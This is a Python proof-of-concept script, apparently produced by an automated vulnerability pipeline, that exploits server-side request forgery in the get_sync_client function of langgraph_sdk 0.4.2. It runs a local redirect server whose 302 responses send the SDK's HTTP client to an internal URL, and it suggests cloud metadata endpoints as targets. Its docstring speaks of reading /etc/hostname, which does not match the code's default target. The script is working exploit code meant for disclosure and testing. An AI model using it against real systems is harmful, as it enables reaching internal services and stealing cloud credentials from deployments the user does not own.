#!/usr/bin/env python3
# PoC for langgraph_sdk-0.4.2 (/tmp/langgraph_sdk/langgraph_sdk-0.4.2)
# Path: ssrf-016
# Sink: get_sync_client
# Auto-generated — run with: python3 ssrf_url_httpx_get_sync_client.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via get_sync_client in langgraph_sdk-0.4.2

This script demonstrates that the `get_sync_client` function accepts an arbitrary
URL without validation, allowing an attacker to make requests to internal services
(e.g., cloud metadata endpoints, internal APIs).

The exploit works by:
1. Creating a simple HTTP server that returns a redirect to an internal IP
2. Calling get_sync_client with the attacker's server URL
3. The httpx client follows the redirect and makes a request to the internal service

WARNING: This PoC uses a benign payload (reading /etc/hostname) by default.
Do NOT use against systems you don't own or have permission to test.
"""

import argparse
import sys
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

# Import the vulnerable function
from langgraph_sdk import get_sync_client


class RedirectHandler(BaseHTTPRequestHandler):
    """HTTP handler that returns a 302 redirect to an internal target."""
    
    def do_GET(self):
        """Handle GET requests by redirecting to the internal target."""
        self.send_response(302)
        self.send_header('Location', self.server.target_url)
        self.end_headers()
    
    def log_message(self, format, *args):
        """Suppress default logging for cleaner output."""
        pass


def start_redirect_server(host, port, target_url):
    """
    Start a simple HTTP server that redirects all requests to the target URL.
    
    Args:
        host: Host to bind to
        port: Port to listen on
        target_url: URL to redirect to
    
    Returns:
        The started server instance
    """
    server = HTTPServer((host, port), RedirectHandler)
    server.target_url = target_url
    
    # Start server in a separate thread
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    
    print(f"[*] Redirect server listening on {host}:{port}")
    print(f"[*] Redirecting to: {target_url}")
    
    return server


def exploit_ssrf(attacker_url, internal_target, timeout=10):
    """
    Attempt SSRF by using get_sync_client with a redirecting attacker URL.
    
    Args:
        attacker_url: URL of the attacker-controlled server that will redirect
        internal_target: Internal URL to target (e.g., http://169.254.169.254/latest/meta-data/)
        timeout: Timeout for HTTP requests in seconds
    
    Returns:
        Response text if successful, None otherwise
    """
    print(f"\n[*] Attempting SSRF via get_sync_client...")
    print(f"[*] Attacker URL: {attacker_url}")
    print(f"[*] Internal target: {internal_target}")
    
    try:
        # Create the client with the attacker URL
        # The httpx client will follow the redirect to the internal target
        client = get_sync_client(url=attacker_url, timeout=timeout)
        
        # Make a request - this will follow the redirect to the internal service
        # We use the underlying httpx client directly for more control
        response = client.client.get("/")
        
        print(f"[+] Request succeeded!")
        print(f"[+] Status code: {response.status_code}")
        print(f"[+] Response headers: {dict(response.headers)}")
        print(f"[+] Response body (first 500 chars): {response.text[:500]}")
        
        return response.text
        
    except Exception as e:
        print(f"[-] Error during SSRF attempt: {e}")
        return None


def main():
    parser = argparse.ArgumentParser(
        description="PoC: SSRF via get_sync_client in langgraph_sdk-0.4.2"
    )
    parser.add_argument(
        "--internal-target",
        default="http://127.0.0.1:8080/",
        help="Internal URL to target (default: http://127.0.0.1:8080/)"
    )
    parser.add_argument(
        "--attacker-host",
        default="127.0.0.1",
        help="Host for the redirect server (default: 127.0.0.1)"
    )
    parser.add_argument(
        "--attacker-port",
        type=int,
        default=9999,
        help="Port for the redirect server (default: 9999)"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Timeout for HTTP requests in seconds (default: 10)"
    )
    
    args = parser.parse_args()
    
    # Validate the internal target URL
    parsed = urlparse(args.internal_target)
    if not parsed.scheme or not parsed.netloc:
        print(f"[-] Invalid internal target URL: {args.internal_target}")
        sys.exit(1)
    
    # Build the attacker URL
    attacker_url = f"http://{args.attacker_host}:{args.attacker_port}"
    
    print("=" * 60)
    print("SSRF PoC for langgraph_sdk-0.4.2")
    print("=" * 60)
    print(f"\n[*] Starting redirect server...")
    
    try:
        # Start the redirect server
        server = start_redirect_server(
            args.attacker_host,
            args.attacker_port,
            args.internal_target
        )
        
        # Give the server a moment to start
        time.sleep(0.5)
        
        # Attempt the SSRF
        result = exploit_ssrf(attacker_url, args.internal_target, args.timeout)
        
        if result:
            print("\n[+] SSRF exploit completed successfully!")
            print("[+] The get_sync_client function followed the redirect to the internal target.")
        else:
            print("\n[-] SSRF exploit failed.")
            print("[*] This could mean:")
            print("  - The internal target is not reachable")
            print("  - The target service returned an error")
            print("  - Network restrictions are in place")
        
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        sys.exit(1)
    finally:
        # Cleanup
        try:
            server.shutdown()
        except:
            pass


if __name__ == "__main__":
    main()
